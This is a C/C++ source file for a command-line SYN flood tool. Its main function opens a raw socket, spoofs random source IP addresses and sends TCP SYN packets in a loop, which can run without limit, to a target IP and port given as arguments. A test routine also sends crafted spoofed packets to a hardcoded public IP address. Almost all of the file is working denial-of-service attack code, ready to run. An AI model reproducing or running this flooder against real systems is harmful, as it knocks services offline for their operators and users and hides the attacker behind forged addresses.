#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/if.h>
#include <string.h>
#include <stdlib.h>
#include <linux/if_packet.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include "ip.h"
#include "tcp.h"
#include "udp.h"
#include <sys/socket.h>
#include <errno.h>
#include <unistd.h>


void syn_flood(char *dst_ip, ushort dst_port, long intval, int times)
{
	ubyte buf[1024];
	IP_PACKET  *ip = new(buf) IP_PACKET;
	TCP_PACKET *tcp;

	int s;
	CHECK(s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP));

	int one = 1;
	const int *val = &one;
	setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));

	struct sockaddr_in dst_addr;
	dst_addr.sin_family = AF_INET;
	dst_addr.sin_port = htons(dst_port);
	dst_addr.sin_addr.s_addr = inet_addr(dst_ip);
	bzero(&dst_addr.sin_zero, 8);

	int ret;
	ip->protocol = IP_PROTO_TCP;
	ip->dst = inet_addr(dst_ip);
	ip->src = inet_addr("127.0.0.1");

	
	tcp = new(buf+IP_HEAD_LEN)TCP_PACKET;
	tcp->src_port = htons(7788);
	tcp->dst_port =  htons(dst_port);
	tcp->SYN = 1;
	tcp->window = htons(1024);
	int i = 0;
	int k = 0;
	while(times==0 || i++ < times)
	{
		k++;
		tcp->src_port = htons(ntohs(tcp->src_port)+2);
		char ipbuf[20];
		sprintf(ipbuf, "%d.%d.%d.%d", rand()%255+1, rand()%255+1, rand()%255+1, rand()%255+1);
		ip->src   = inet_addr(ipbuf); 
		tcp->calc_checksum(ip, TCP_HEAD_LEN);
		CHECK(ret=sendto(s, buf, IP_HEAD_LEN+TCP_HEAD_LEN, 0, (struct sockaddr*)&dst_addr, sizeof(struct sockaddr)));	
		printf("send:%d\n", k);
		usleep(intval*1000);
	}
	printf("ret=%d\n", ret);

	close(s);
}

void test();
int main(int argc, char *argv[])
{
	if(argc < 5)
	{
		printf("Usage:./syn_flood  dst_ip  dst_port intval(ms) times\n");
		exit(0);
	}
	syn_flood(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
	//test();
	return 0;
}

void test()
{
	ubyte buf[1024];
	IP_PACKET  *ip = new(buf) IP_PACKET;
	TCP_PACKET *tcp;
	UDP_PACKET *udp = new(buf+20) UDP_PACKET;

	printf("IP  size:%d %d\n", sizeof(IP_PACKET), sizeof(ip));
	printf("TCP size:%d %d\n", sizeof(TCP_PACKET), sizeof(tcp));
	printf("IP HEADLEN:%u\n", ip->head_len);
	int s;
	CHECK(s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP));

	int one = 1;
	const int *val = &one;
	setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));

		struct sockaddr_in dst_addr;
	dst_addr.sin_family = AF_INET;
	dst_addr.sin_port = htons(80);
	dst_addr.sin_addr.s_addr = inet_addr("180.97.33.108");
	bzero(&dst_addr.sin_zero, 8);

	int ret;
	ip->protocol = IP_PROTO_UDP;
	ip->src = inet_addr("192.168.232.129");
	ip->dst = inet_addr("180.97.33.108");
	//ip->tot_len = 28;
	udp->src_port = htons(1087);
	udp->dst_port = htons(13);
	udp->len = htons(8+7);

	buf[28] = 0x54; buf[29]=0x45; buf[30]=0x53; buf[31]=0x54;
	buf[32] = 0x49; buf[33]=0x4e; buf[34]=0x47;
	udp->calc_checksum(ip);
	printf("check sum:%x\n", udp->checksum);
	CHECK(ret=sendto(s, buf, IP_HEAD_LEN +15, 0, (struct sockaddr*)&dst_addr, sizeof(struct sockaddr)));
	
	printf("ret=%d\n", ret);
	
	tcp = new(buf+IP_HEAD_LEN)TCP_PACKET;
	tcp->src_port = htons(7788);
	tcp->dst_port =  htons(80);
	tcp->SYN = 1;
	tcp->window = htons(1024);
	ip->protocol = IP_PROTO_TCP;
	buf[IP_HEAD_LEN+TCP_HEAD_LEN] = 'a';
	buf[IP_HEAD_LEN+TCP_HEAD_LEN+1] = 'b';
	buf[IP_HEAD_LEN+TCP_HEAD_LEN+2] = 'c';
	tcp->calc_checksum(ip, TCP_HEAD_LEN);
	CHECK(ret=sendto(s, buf, IP_HEAD_LEN+TCP_HEAD_LEN, 0, (struct sockaddr*)&dst_addr, sizeof(struct sockaddr)));	
	printf("ret=%d\n", ret);

	close(s);
}
